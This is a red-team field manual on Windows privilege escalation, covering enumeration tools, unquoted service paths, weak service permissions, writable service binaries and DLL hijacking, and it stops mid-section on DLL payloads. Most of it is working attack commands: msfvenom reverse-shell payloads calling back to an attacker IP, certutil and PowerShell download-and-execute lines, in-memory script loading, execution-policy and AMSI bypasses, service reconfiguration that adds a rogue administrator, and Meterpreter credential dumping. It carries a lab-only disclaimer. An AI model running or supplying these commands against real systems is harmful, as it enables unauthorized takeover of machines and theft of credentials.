# Windows Privilege Escalation — Red Team Field Manual
### SeImpersonate | Service Misconfigs | Registry | DLL Hijacking | AlwaysInstallElevated | WinPEAS

> **Series Position:** Module 8
> Cross-references: `Active_Directory_RedTeam_Field_Manual.md` (domain context, token impersonation, Potato attacks), `Ports_Protocols_RedTeam_Field_Manual.md` (RDP 3389, WinRM 5985, SMB 445), `Linux_PrivEsc_PostExploitation_RedTeam_Field_Manual.md` (same methodology, different OS).
>
> **Red Team Lens:** Windows PrivEsc is the bridge between "I have a low-priv shell on a Windows box" and "I control this machine and can pivot deeper." Every technique here either gets you SYSTEM on the local machine, or unlocks domain-level movement. Master the methodology — the specific techniques are less important than the ability to enumerate, prioritize, and chain.
>
> **Lab Disclaimer:** All techniques are for authorized environments only — your own lab, HTB, PG Practice, OSCP Windows machines, CRTO labs.

---

## Table of Contents

### PART 1 — WINDOWS POST-EXPLOITATION MINDSET
1. [The First 60 Seconds on Windows](#1-the-first-60-seconds-on-windows)
2. [Shell Types & Stabilization on Windows](#2-shell-types--stabilization-on-windows)
3. [Windows Situational Awareness](#3-windows-situational-awareness)

### PART 2 — AUTOMATED ENUMERATION
4. [WinPEAS — The Windows LinPEAS](#4-winpeas)
5. [PowerUp & SharpUp — PowerShell PrivEsc](#5-powerup--sharpup)
6. [Seatbelt — Security Configuration Audit](#6-seatbelt)
7. [JAWS & Watson — Additional Tools](#7-jaws--watson)

### PART 3 — SERVICE EXPLOITATION
8. [Unquoted Service Paths](#8-unquoted-service-paths)
9. [Weak Service Permissions (Modifiable Services)](#9-weak-service-permissions)
10. [Writable Service Binary Path](#10-writable-service-binary-path)
11. [DLL Hijacking via Services](#11-dll-hijacking-via-services)

### PART 4 — REGISTRY ATTACKS
12. [AlwaysInstallElevated — MSI as SYSTEM](#12-alwaysinstallelevated)
13. [Registry Autorun Key Hijacking](#13-registry-autorun-key-hijacking)
14. [Credentials in Registry](#14-credentials-in-registry)
15. [Stored AutoLogon Credentials](#15-stored-autologon-credentials)

### PART 5 — TOKEN & PRIVILEGE ABUSE
16. [Windows Privileges — The Complete Map](#16-windows-privileges--the-complete-map)
17. [SeImpersonatePrivilege — Potato Family](#17-seimpersonateprivilege--potato-family)
18. [SeDebugPrivilege — Process Memory Access](#18-sedebugprivilege)
19. [SeBackupPrivilege — Read Any File](#19-sebackupprivilege)
20. [SeRestorePrivilege — Write Any File](#20-serestoreprivilege)
21. [SeTakeOwnershipPrivilege](#21-setakeownershipprivilege)
22. [SeLoadDriverPrivilege — Kernel Driver Load](#22-seloaddriverprivilege)

### PART 6 — CREDENTIAL ATTACKS
23. [Windows Credential Locations — Complete Map](#23-windows-credential-locations)
24. [SAM & SYSTEM — Local Hash Extraction](#24-sam--system)
25. [LSASS Credential Extraction (All Methods)](#25-lsass-credential-extraction)
26. [DPAPI — Windows Secret Vault](#26-dpapi--windows-secret-vault)
27. [Credential Manager & Windows Vault](#27-credential-manager--windows-vault)
28. [Browser Credentials on Windows](#28-browser-credentials-on-windows)
29. [Searching for Credentials in Files](#29-searching-for-credentials-in-files)

### PART 7 — SCHEDULED TASKS & STARTUP
30. [Scheduled Task Abuse](#30-scheduled-task-abuse)
31. [Startup Folder & Registry Autoruns](#31-startup-folder--registry-autoruns)

### PART 8 — UAC BYPASS
32. [UAC — What It Is and Why It Matters](#32-uac--what-it-is-and-why-it-matters)
33. [UAC Bypass Techniques](#33-uac-bypass-techniques)

### PART 9 — ADVANCED TECHNIQUES
34. [DLL Injection & Hijacking (General)](#34-dll-injection--hijacking-general)
35. [Named Pipe Impersonation](#35-named-pipe-impersonation)
36. [Abusing Vulnerable Drivers (BYOVD)](#36-abusing-vulnerable-drivers-byovd)
37. [PrintNightmare (CVE-2021-1675)](#37-printnightmare)
38. [HiveNightmare / SeriousSAM (CVE-2021-36934)](#38-hivenightmare--serioussam)

### PART 10 — PERSISTENCE ON WINDOWS
39. [Windows Persistence Mechanisms](#39-windows-persistence-mechanisms)

### PART 11 — FULL CHAINS
40. [Full PrivEsc Lab: Low-Priv Shell → SYSTEM](#40-full-privesc-lab)
41. [Windows PrivEsc Decision Tree](#41-windows-privesc-decision-tree)

---

# PART 1 — WINDOWS POST-EXPLOITATION MINDSET

---

## 1. The First 60 Seconds on Windows

### Layman's Terms
Same principle as Linux — **context before exploitation**. Windows has more layers (UAC, integrity levels, token types, AppLocker) that affect what you can do. Getting these wrong means burning your access or triggering detection. Spend the first 60 seconds understanding your position.

### Real-World Event
In the **Colonial Pipeline ransomware attack (2021)**, attackers gained initial access via a legacy VPN account. They spent time enumerating the environment — understanding network topology, identifying high-value targets — before deploying ransomware. The enumeration phase is where attacks are won or lost. Rushing it leads to mistakes, detection, and missed opportunities.

```cmd
:: ══════════════════════════════════════════════════════════════════
:: FIRST 60 SECONDS — RUN IN THIS ORDER
:: ══════════════════════════════════════════════════════════════════

:: 1. WHO AM I? (5 seconds)
whoami
whoami /all
:: Expected:
:: User Name:  corp\bob
:: SID: S-1-5-21-...-1104
:: Group Memberships:
::   CORP\Domain Users
::   BUILTIN\Users
:: Privileges:
::   SeChangeNotifyPrivilege         Enabled
::   SeImpersonatePrivilege          Enabled   ← JACKPOT — Potato attack!
::   SeShutdownPrivilege             Disabled
::
:: READ THE PRIVILEGES SECTION CAREFULLY:
:: SeImpersonatePrivilege = run Potato attack → SYSTEM
:: SeBackupPrivilege      = read any file → dump SAM/NTDS
:: SeDebugPrivilege       = dump LSASS
:: SeLoadDriverPrivilege  = load kernel driver → SYSTEM
:: SeRestorePrivilege     = write any file → plant backdoor

:: 2. WHAT MACHINE IS THIS? (5 seconds)
systeminfo | findstr /B /C:"Host Name" /C:"OS" /C:"System Type" /C:"Domain"
:: Expected:
:: Host Name:    WS01
:: OS Name:      Microsoft Windows 10 Pro
:: OS Version:   10.0.19041 Build 19041   ← Build number → check PrivEsc CVEs
:: System Type:  x64-based PC
:: Domain:       corp.local               ← Domain-joined = AD context matters

:: 3. NETWORK — WHAT CAN I REACH? (10 seconds)
ipconfig /all
:: Look for: multiple adapters (pivot opportunity!), internal IP ranges
route print
:: Internal routes to other networks = pivot paths
netstat -ano
:: Active connections + listening ports
:: Expected interesting:
:: 127.0.0.1:1433  LISTENING  (MSSQL on localhost — accessible to us!)
:: 127.0.0.1:8080  LISTENING  (Internal web app)

:: 4. WHAT USERS EXIST? (5 seconds)
net user
:: Local users
net user /domain 2>nul
:: Domain users (if domain-joined)
net localgroup administrators
:: Who's local admin?

:: 5. WHAT PROCESSES ARE RUNNING AS SYSTEM? (10 seconds)
tasklist /v | findstr /I "system nt authority"
:: Look for: processes running as SYSTEM that we might inject into
:: Or: processes belonging to root/admin that handle user input

:: 6. INTERESTING RUNNING SERVICES (10 seconds)
sc query type= all state= running | findstr "SERVICE_NAME DISPLAY"
:: Look for: third-party services (not Microsoft) → often have PrivEsc issues
:: Custom company services = most likely vulnerable

:: 7. WHAT CAN I WRITE? (5 seconds)
:: Quick check for common writable locations:
icacls "C:\Program Files" 2>nul | findstr /I "everyone users builtin"
icacls "C:\Windows\Temp" 2>nul
echo Test > C:\Windows\Temp\test.txt 2>nul && echo "Writable!" || echo "Not writable"

:: 8. ANTIVIRUS? (5 seconds)
sc query windefend
:: Windows Defender status
wmic /namespace:\\root\securitycenter2 path antivirusproduct get displayName,productState
:: Third-party AV products

:: 9. QUICK AUTORUN CHECK (5 seconds)
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
:: Entries here run at startup — if we can replace the binary → SYSTEM
```

---

## 2. Shell Types & Stabilization on Windows

### Windows Shell Types

```
CMD.EXE — basic command interpreter:
  - Limited scripting capability
  - No tab completion (mostly)
  - Cannot run PowerShell cmdlets
  - Old school, always present

POWERSHELL.EXE — advanced shell:
  - Full .NET access
  - Rich scripting (objects, modules)
  - Execution policy may block scripts
  - Script block logging when enabled
  - Best for: running tools, AD enumeration, complex scripts

POWERSHELL ISE — GUI version:
  - Interactive script development
  - Not available in remote sessions

CMD VS POWERSHELL EXECUTION POLICY:
  # Check policy:
  Get-ExecutionPolicy -List
  
  Policies (least to most restrictive):
  Unrestricted → AllSigned → RemoteSigned → Restricted
  
  Bypass without changing policy:
  powershell -ExecutionPolicy Bypass -File script.ps1
  powershell -ep bypass -c "IEX (iwr http://10.10.10.50/script.ps1 -UseBasicParsing)"
  powershell -encodedcommand BASE64_ENCODED_COMMAND
```

### Shell Upgrade — From Netcat to Meterpreter

```bash
# You have a raw CMD netcat shell — upgrade to Meterpreter for stability:

# On Kali — generate Meterpreter payload:
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.10.50 LPORT=4444 \
  -f exe -o shell.exe
# Start handler:
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.10.50; set LPORT 4444; run"

# In your CMD shell on target — download and execute:
certutil.exe -urlcache -split -f http://10.10.10.50:8080/shell.exe C:\Windows\Temp\shell.exe
C:\Windows\Temp\shell.exe

# OR: PowerShell download and execute:
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.10.50:8080/shell.exe','C:\Windows\Temp\shell.exe'); Start-Process C:\Windows\Temp\shell.exe"

# Meterpreter features critical for PrivEsc:
meterpreter > getuid           # Current user
meterpreter > getsystem        # Auto-attempt SYSTEM (uses named pipe + token impersonation)
meterpreter > getprivs         # List enabled privileges
meterpreter > run post/multi/recon/local_exploit_suggester  # Auto-find PrivEsc
meterpreter > load kiwi        # Load Mimikatz module
meterpreter > creds_all        # Dump all credentials
meterpreter > hashdump         # Dump local hashes

# If getsystem fails — manual PrivEsc needed (this module covers those)
```

### PowerShell Remoting (Evil-WinRM Upgrade)

```bash
# From Kali — if you have valid credentials:
evil-winrm -i 10.10.10.100 -u bob -p Password1!
# Full PowerShell session with upload/download capabilities

# With hash:
evil-winrm -i 10.10.10.100 -u bob -H NTLM_HASH

# Evil-WinRM built-in commands:
*Evil-WinRM* PS> upload /kali/WinPEAS.exe C:\Windows\Temp\WinPEAS.exe
*Evil-WinRM* PS> download C:\Windows\Temp\loot.txt /kali/loot/
*Evil-WinRM* PS> menu      # See all available modules
*Evil-WinRM* PS> Bypass-4MSI   # Attempt AMSI bypass
*Evil-WinRM* PS> Invoke-Binary /kali/SharpUp.exe  # Run .NET binary from memory
```

---

## 3. Windows Situational Awareness

```powershell
# ══════════════════════════════════════════════════════════════════
# COMPREHENSIVE WINDOWS ENUMERATION
# ══════════════════════════════════════════════════════════════════

# ── SYSTEM INFO ───────────────────────────────────────────────────
systeminfo
# Pay attention to:
# OS Version + Build → maps to specific PrivEsc CVEs
# Hotfixes installed → what patches are MISSING?
# "Hotfix(es): N/A" → severely unpatched system!

# Check hotfixes:
wmic qfe list
# Count patches — few patches = high probability of kernel exploits

# ── USER AND GROUP CONTEXT ────────────────────────────────────────
whoami /all           # Your full context (groups, privileges, SID)
net localgroup        # All local groups
net localgroup administrators  # Members of local admins
net user              # All local users
net user bob          # Specific user details

# Check if current user or group has admin:
net localgroup administrators | findstr /I "bob domain"

# ── NETWORK ───────────────────────────────────────────────────────
ipconfig /all         # All adapters, DNS, DHCP
arp -a                # ARP cache — recently communicated hosts
route print           # Routing table
netstat -ano          # All connections + PIDs
:: Note PIDs for interesting connections:
tasklist /fi "PID eq 1234"  # What process owns that connection?

# Firewall status:
netsh advfirewall show allprofiles state
netsh advfirewall firewall show rule name=all

# ── INSTALLED SOFTWARE ────────────────────────────────────────────
wmic product get name,version 2>nul | sort
:: Look for: AV products, EDR solutions, vulnerable versions

:: Installed programs from registry:
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s 2>nul | findstr "DisplayName DisplayVersion"
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s 2>nul | findstr "DisplayName DisplayVersion"

# 64-bit programs on 64-bit Windows:
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall" /s | findstr "DisplayName"

# ── SERVICES ──────────────────────────────────────────────────────
# All services with their paths:
wmic service get name,displayname,pathname,startmode | findstr /I "auto" | findstr /I /V "C:\Windows\\"
:: Non-Windows services running at startup = prime PrivEsc targets!

:: Specific service info:
sc qc "ServiceName"
:: Check: BINARY_PATH_NAME (the executable it runs)
:: Check: SERVICE_START_NAME (what account it runs as)
:: If SERVICE_START_NAME = LocalSystem → running as SYSTEM!

# ── SCHEDULED TASKS ───────────────────────────────────────────────
schtasks /query /fo LIST /v | findstr /I "task name run as author"
:: Look for: tasks running as SYSTEM with writable executables

# ── INTERESTING FILES ─────────────────────────────────────────────
# Common credential locations:
type C:\Windows\System32\config\SAM 2>nul  # Locked, but check anyway
type C:\Windows\Repair\SAM 2>nul            # Backup SAM (sometimes readable!)
type C:\Windows\Repair\SYSTEM 2>nul
type C:\Windows.old\Windows\System32\config\SAM 2>nul  # Old Windows upgrade!

dir /s /b C:\Users\*.txt 2>nul | findstr /I "pass cred secret key"
dir /s /b C:\inetpub\ 2>nul | findstr /I "web.config"
dir /s /b C:\ /a:h 2>nul | findstr /I "vnc.ini unattend.xml sysprep"

# Unattend files (contain base64-encoded admin passwords!):
type C:\Windows\Panther\Unattend.xml 2>nul
type C:\Windows\Panther\Unattended.xml 2>nul
type C:\Windows\system32\sysprep\sysprep.xml 2>nul
type C:\Windows\system32\sysprep.inf 2>nul
:: These files store the local admin password from Windows deployment!
:: Password is base64-encoded: echo BASE64_STRING | certutil -decode - output.txt

# IIS web.config (often contains database connection strings):
type C:\inetpub\wwwroot\web.config 2>nul
type C:\inetpub\wwwwroot\web.config 2>nul
dir /s web.config 2>nul

# ── REGISTRY CHECKS ───────────────────────────────────────────────
# AutoLogon credentials:
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr "DefaultUserName DefaultPassword AutoAdminLogon"
:: DefaultPassword = cleartext admin password stored for autologon!

# Always Install Elevated:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
:: If both = 0x1 → MSI files run as SYSTEM → instant SYSTEM!

# Stored credentials:
cmdkey /list
:: Shows stored credentials (Windows Vault)
```

---

# PART 2 — AUTOMATED ENUMERATION

---

## 4. WinPEAS — The Windows LinPEAS

### Layman's Terms
WinPEAS is the Windows equivalent of LinPEAS — runs hundreds of checks and color-codes findings by likelihood of exploitation. Red = try immediately. Yellow = investigate. White = informational noise.

```powershell
# ── DELIVERY METHODS ──────────────────────────────────────────────

# Method 1: Download from GitHub releases (if internet access):
(New-Object Net.WebClient).DownloadFile('https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe', 'C:\Windows\Temp\wp.exe')
C:\Windows\Temp\wp.exe

# Method 2: From your HTTP server:
# On Kali: python3 -m http.server 8080
certutil.exe -urlcache -split -f http://10.10.10.50:8080/winPEASx64.exe C:\Windows\Temp\wp.exe
C:\Windows\Temp\wp.exe

# Method 3: PowerShell (no binary on disk):
# Download and execute directly in memory:
$url = "http://10.10.10.50:8080/winPEASx64.exe"
$bytes = (New-Object Net.WebClient).DownloadData($url)
$assembly = [System.Reflection.Assembly]::Load($bytes)
[winPEAS.Program]::Main("")
# Requires winPEAS .NET version

# Method 4: Evil-WinRM upload:
*Evil-WinRM* PS> upload /kali/winPEASx64.exe C:\Windows\Temp\wp.exe
*Evil-WinRM* PS> C:\Windows\Temp\wp.exe

# ── RUNNING OPTIONS ───────────────────────────────────────────────
# Full run:
winPEASx64.exe

# Specific check categories:
winPEASx64.exe servicesinfo      # Service configurations
winPEASx64.exe systeminfo        # System/OS info
winPEASx64.exe userinfo          # Users, groups, privileges
winPEASx64.exe filesinfo         # Interesting files, credentials
winPEASx64.exe networkinfo       # Network configuration

# Output to file (for review):
winPEASx64.exe > C:\Windows\Temp\winpeas_output.txt
# Transfer to Kali for review:
# evil-winrm: download C:\Windows\Temp\winpeas_output.txt /kali/loot/

# ── READING WINPEAS OUTPUT ────────────────────────────────────────
# KEY SECTIONS TO ALWAYS CHECK FIRST:

# 1. "Checking AlwaysInstallElevated" → both HKCU and HKLM = 1 → instant SYSTEM
# 2. "Interesting Services - non-Microsoft" → unquoted paths, weak perms
# 3. "Modifiable Services" → can we change the binary path?
# 4. "Looking if autologon credentials" → cleartext admin password
# 5. "Unattended Install Files" → deployment passwords
# 6. "Checking Windows Vault" → saved credentials
# 7. "Current Token privileges" → SeImpersonatePrivilege etc.
# 8. "Scheduled tasks" → tasks running writable binaries as SYSTEM
# 9. "DLL Hijacking" → missing DLLs we can plant
# 10. "SAM & SYSTEM backup" → if backup files are readable
```

---

## 5. PowerUp & SharpUp — PowerShell PrivEsc

```powershell
# PowerUp.ps1 — PowerShell PrivEsc checker (older but very reliable)
# SharpUp.exe — C# port of PowerUp (better AV evasion)

# ── POWERUP ───────────────────────────────────────────────────────
# Load from memory (preferred — no file on disk):
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.50:8080/PowerUp.ps1')

# Run all checks:
Invoke-AllChecks

# Expected output (examples of findings):
# [*] Checking for unquoted service paths...
# ServiceName   : VulnerableService
# Path          : C:\Program Files\Vulnerable App\service.exe  ← unquoted!
# StartName     : LocalSystem    ← Runs as SYSTEM!
# AbuseFunction : Write-ServiceBinary -ServiceName 'VulnerableService' -Path C:\Program.exe

# [*] Checking service executable and argument permissions...
# ServiceName                     : WeakService
# Path                            : C:\WeakService\service.exe
# ModifiableFile                  : C:\WeakService\service.exe  ← WE CAN WRITE IT!
# ModifiableFilePermissions       : WriteOwner, Write, WriteAttributes
# StartName                       : LocalSystem

# [*] Checking %PATH% for potentially hijackable .dll locations...
# ModifiablePath : C:\Python38\  ← We can write DLLs here!
# PercentPath    : C:\Python38\

# Run specific check:
Get-UnquotedService         # Only check unquoted service paths
Get-ModifiableService       # Only check modifiable services
Get-ModifiableServiceFile   # Check modifiable service executables
Get-ModifiableRegistryAutoRun  # Registry autorun keys
Get-CachedGPPPassword       # GPP passwords in SYSVOL

# Auto-exploit (creates local admin account):
Invoke-AllChecks | Where-Object {$_.AbuseFunction} | ForEach-Object {
    & $_.AbuseFunction
}

# ── SHARPUP ───────────────────────────────────────────────────────
# Download: https://github.com/GhostPack/SharpUp/releases
# Better for bypassing AV (compiled C#)
.\SharpUp.exe audit          # Full audit
.\SharpUp.exe HijackablePaths  # Check PATH hijacking
.\SharpUp.exe UnquotedServicePath  # Unquoted paths
.\SharpUp.exe ModifiableServices   # Modifiable services
.\SharpUp.exe CachedGPPCredentials # GPP passwords

# Expected output:
# === SharpUp: Running Privilege Escalation Checks ===
# [*] Checking for Unquoted Service Paths...
#     VulnerableService (C:\Program Files\Vulnerable App\service.exe) - start: auto

# From Evil-WinRM (load from memory):
*Evil-WinRM* PS> Invoke-Binary /kali/SharpUp.exe audit
```

---

## 6. Seatbelt — Security Configuration Audit

```powershell
# Seatbelt: GhostPack tool for security configuration collection
# Less about PrivEsc paths, more about what's on the machine
# Great for: credential locations, security products, configuration weaknesses

# Download: https://github.com/GhostPack/Seatbelt/releases
.\Seatbelt.exe all              # Everything
.\Seatbelt.exe -group=user      # User-specific info
.\Seatbelt.exe -group=system    # System configuration
.\Seatbelt.exe -group=misc      # Miscellaneous
.\Seatbelt.exe -group=remote    # Remote access config

# Most useful individual checks:
.\Seatbelt.exe TokenPrivileges          # Current token privileges
.\Seatbelt.exe WindowsVault             # Saved Windows credentials
.\Seatbelt.exe CredEnum                 # Enumerate credentials
.\Seatbelt.exe ChromiumPresence         # Chrome/Chromium install paths
.\Seatbelt.exe FirefoxPresence          # Firefox install paths
.\Seatbelt.exe NonstandardProcesses     # Unusual processes
.\Seatbelt.exe ScheduledTasks           # All scheduled tasks
.\Seatbelt.exe Services                 # Running services
.\Seatbelt.exe DotNetVersion            # .NET versions (affects tools)
.\Seatbelt.exe LocalUsers               # Local user accounts
.\Seatbelt.exe InterestingProcesses     # Processes worth targeting

# Run from memory:
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.50:8080/Invoke-Seatbelt.ps1')
Invoke-Seatbelt all
```

---

# PART 3 — SERVICE EXPLOITATION

---

## 8. Unquoted Service Paths

### Layman's Terms
When a Windows service path contains spaces and is **not enclosed in quotes**, Windows tries to find the executable by testing multiple interpretations. For the path `C:\Program Files\Vulnerable App\service.exe`, Windows first tries `C:\Program.exe`. If we can create a file at that path — it runs as SYSTEM when the service starts.

### Real-World Event
Unquoted service paths are consistently in the **top 5 PrivEsc vectors** on OSCP exam machines and real engagements. They result from lazy service installation — developers not quoting service binary paths when creating the service registry entry. Still present in enterprise environments running 10-year-old software.

### How It Works

```
Service binary path: C:\Program Files\Vulnerable App\service.exe

Windows resolution order (with space in path, no quotes):
  1. Tries: C:\Program.exe          ← We plant this!
  2. Tries: C:\Program Files\Vulnerable.exe
  3. Tries: C:\Program Files\Vulnerable App\service.exe

If we can write to C:\ → create C:\Program.exe → runs as SYSTEM when service starts!

IMPORTANT:
  - We need WRITE permission to the directory where we place the file
  - OR write permission to an earlier path segment directory
  - Service must be restartable (or wait for machine reboot)
  - Service must run as SYSTEM (or higher priv than current user)
```

### Finding Unquoted Service Paths

```cmd
:: Find ALL services with unquoted paths (spaces in path, no quotes):
wmic service get name,displayname,pathname,startmode | findstr /I "auto" | findstr /I /V "C:\Windows\\" | findstr /I /V """"
:: Explanation:
:: findstr /I "auto"           = only auto-start services
:: findstr /I /V "C:\Windows\" = exclude Windows system services
:: findstr /I /V """"          = exclude paths that have quotes
```

```powershell
# PowerShell version (more reliable):
Get-WmiObject -Class win32_service | Where-Object {
    $_.PathName -notmatch '"' -and     # No quotes
    $_.PathName -match ' ' -and        # Has spaces
    $_.State -eq 'Running' -and        # Currently running
    $_.StartMode -eq 'Auto'            # Auto-start
} | Select-Object Name, DisplayName, PathName, StartMode, StartName

# Expected output:
# Name        : VulnerableService
# DisplayName : Vulnerable Application Service
# PathName    : C:\Program Files\Vulnerable App\service.exe
# StartMode   : Auto
# StartName   : LocalSystem    ← Runs as SYSTEM!
```

### Finding Writable Directories in the Path

```powershell
# For path: C:\Program Files\Vulnerable App\service.exe
# Check each directory segment for write permission:

# Using icacls:
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Vulnerable App"

# PowerShell writability check:
$paths = @("C:\", "C:\Program Files", "C:\Program Files\Vulnerable App")
foreach ($path in $paths) {
    try {
        $testFile = Join-Path $path "test_$(Get-Random).tmp"
        [System.IO.File]::Create($testFile).Close()
        Remove-Item $testFile
        Write-Host "WRITABLE: $path" -ForegroundColor Red
    } catch {
        Write-Host "Not writable: $path" -ForegroundColor Green
    }
}

# Using PowerUp:
Get-ModifiablePath -Path "C:\Program Files\Vulnerable App\service.exe"
```

### Exploitation

```cmd
:: SCENARIO:
:: Service path: C:\Program Files\Vulnerable App\service.exe
:: C:\ is writable by current user (or C:\Program Files\ is writable)
:: Service StartName: LocalSystem

:: Step 1: Generate malicious payload (on Kali):
:: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.50 LPORT=4444 -f exe -o Program.exe

:: Step 2: Place it in the hijackable location:
:: If C:\ is writable:
copy \\10.10.10.50\share\Program.exe C:\Program.exe

:: If C:\Program Files is writable:
copy \\10.10.10.50\share\Vulnerable.exe "C:\Program Files\Vulnerable.exe"
```

```powershell
# Using PowerUp to auto-exploit (adds local admin):
Write-ServiceBinary -ServiceName 'VulnerableService' -Path 'C:\Program.exe'
# Creates a payload at C:\Program.exe that adds:
# localadmin:Password123! as local administrator

# Step 3: Restart the service (if you have permission):
sc stop VulnerableService
sc start VulnerableService
# OR: Wait for reboot

# Step 4: If adding admin account approach used:
net localgroup administrators
# Expected: localadmin now in administrators group
runas /user:localadmin cmd

# Step 5: Reverse shell approach — set up listener first:
# nc -lvnp 4444
# Then restart service → shell as SYSTEM arrives!

# EXPECTED: nt authority\system shell!

# COMMON MISTAKE: Creating malicious binary in wrong location
# Always verify: which path segment Windows will try FIRST
# The file must be placed such that Windows finds IT before the legitimate exe
```

---

## 9. Weak Service Permissions (Modifiable Services)

### Layman's Terms
Windows services have Access Control Lists (ACLs) defining who can interact with them. If the service's ACL gives low-privileged users `SERVICE_CHANGE_CONFIG` or higher — **we can change what binary the service runs**. Point it at our malicious executable, restart the service = SYSTEM.

```powershell
# ── FIND MODIFIABLE SERVICES ──────────────────────────────────────

# Using PowerUp:
Get-ModifiableService
# Expected output:
# ServiceName   : WeakPermService
# Path          : C:\services\legit.exe
# StartName     : LocalSystem
# AbuseFunction : Invoke-ServiceAbuse -ServiceName 'WeakPermService'

# Manual check using sc sdshow:
sc sdshow VulnerableService
# Expected output (DACL section):
# D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;RPWP;;;WD)
#                                                                      ^^^^^
# WD = World (Everyone) has RPWP = Read + Write permissions!

# Better — check with accesschk (Sysinternals):
# Download: https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk
accesschk.exe -uwcqv "Everyone" * 2>nul
accesschk.exe -uwcqv "Authenticated Users" * 2>nul
accesschk.exe -uwcqv "BUILTIN\Users" * 2>nul

# Expected vulnerable output:
# RW VulnerableService
#    SERVICE_ALL_ACCESS   ← Full control! Can change anything including binary path

# Check specific service:
accesschk.exe -ucqv VulnerableService
# Expected:
# VulnerableService
#   RW NT AUTHORITY\SYSTEM
#   RW BUILTIN\Administrators
#   RW CORP\bob              ← Bob (us!) has RW access to service config!

# ── EXPLOITATION ──────────────────────────────────────────────────

# Method 1: Change binary path to our payload:
sc config VulnerableService binpath= "C:\Windows\Temp\shell.exe"
sc stop VulnerableService
sc start VulnerableService
# Expected: SYSTEM reverse shell (set up listener first!)

# Method 2: Change binary path to add admin user:
sc config VulnerableService binpath= "cmd /c net user hacker Password123! /add && net localgroup administrators hacker /add"
sc stop VulnerableService
sc start VulnerableService
# Expected:
net localgroup administrators
# hacker is now local admin!

# Method 3: PowerUp auto-exploit:
Invoke-ServiceAbuse -ServiceName 'VulnerableService'
# Automatically adds LOCALSERVICE to local administrators
# Expected: "Service 'VulnerableService' binary path changed and abused!"

Invoke-ServiceAbuse -ServiceName 'VulnerableService' \
  -Username hacker -Password Password123!
# Adds specific user

# After adding to admin — run as admin:
runas /user:hacker cmd
# or Evil-WinRM with new credentials:
# evil-winrm -i 10.10.10.100 -u hacker -p Password123!
```

---

## 10. Writable Service Binary Path

```powershell
# SCENARIO: The SERVICE EXECUTABLE ITSELF is writable by us
# We don't need to change service config — just replace the binary!

# Find services where we can write the actual exe:
$services = Get-WmiObject win32_service | Where-Object {$_.State -eq "Running"}
foreach ($svc in $services) {
    $path = $svc.PathName -replace '"','' -replace ' .*',''
    if (Test-Path $path) {
        $acl = Get-Acl $path -ErrorAction SilentlyContinue
        if ($acl.AccessToString -match "Everyone|Users|Authenticated Users.*Allow.*Write") {
            Write-Host "WRITABLE SERVICE BINARY: $($svc.Name) - $path" -ForegroundColor Red
        }
    }
}

# Expected:
# WRITABLE SERVICE BINARY: WeakService - C:\WeakService\service.exe

# Check with accesschk:
accesschk.exe -uwq "Everyone" "C:\WeakService\service.exe"
# Expected:
# C:\WeakService\service.exe
#   RW Everyone     ← World-writable!
#      FILE_ALL_ACCESS

# EXPLOIT: Replace the binary:
# Backup original:
copy "C:\WeakService\service.exe" "C:\WeakService\service.exe.bak"
# Copy our malicious payload:
copy C:\Windows\Temp\shell.exe "C:\WeakService\service.exe"
# Restart service:
sc stop WeakService && sc start WeakService
# Expected: SYSTEM reverse shell!
```

---

## 11. DLL Hijacking via Services

### Layman's Terms
When Windows programs load DLLs (dynamic libraries), they search for them in a **specific order of directories**. If we control any directory in the search path — or if the program tries to load a DLL that doesn't exist — we plant our malicious DLL there and it gets loaded (and executed) in the context of the running program.

```powershell
# ── FINDING MISSING DLLS (most reliable method) ───────────────────

# Procmon (Sysinternals) — THE tool for DLL hijacking:
# Run Procmon with filter: Operation = "CreateFile" AND Result = "NAME NOT FOUND"
# This shows every DLL that Windows LOOKED FOR but COULDN'T FIND
# If any of those search paths are writable by us → we can plant the DLL

# On Kali — analyze with frida-dexcompiler or use Procmon on Windows test VM:
# 1. Start the vulnerable service/program
# 2. Filter: Process Name = service.exe, Operation = NAME NOT FOUND
# Expected Procmon output:
# service.exe  CreateFile  C:\Program Files\App\missing.dll  NAME NOT FOUND
# service.exe  CreateFile  C:\Windows\System32\missing.dll   NAME NOT FOUND
# service.exe  CreateFile  C:\Windows\missing.dll            NAME NOT FOUND
# service.exe  CreateFile  C:\Windows\Temp\missing.dll       NAME NOT FOUND ← We can write here!

# ── DLL SEARCH ORDER ─────────────────────────────────────────────
# Windows DLL search order (DLL Safe Search enabled — default):
# 1. The directory from which the application was loaded
# 2. The System directory (C:\Windows\System32)
# 3. The 16-bit system directory
# 4. The Windows directory (C:\Windows)
# 5. The current working directory
# 6. Directories in the PATH environment variable

# KEY INSIGHT: If we can write to any directory in PATH
# that comes BEFORE the legitimate DLL location → DLL hijacking!

# Check PATH for writable directories:
foreach ($dir in $env:PATH.Split(';')) {
    try {
        $test = Join-Path $dir "test_$(Get-Random).tmp"
        [System.IO.File]::Create($test).Close()
        Remove-Item $test
        Write-Host "WRITABLE PATH DIR: $dir" -ForegroundColor Red
    } catch {}
}
# If C:\Python39\ or C:\Tools\ is writable → any DLL that app tries to load
# from PATH and doesn't find in system32 → we can hijack!

# ── CREATE MALICIOUS DLL ──────────────────────────────────────────
# On Kali — generate DLL payload:
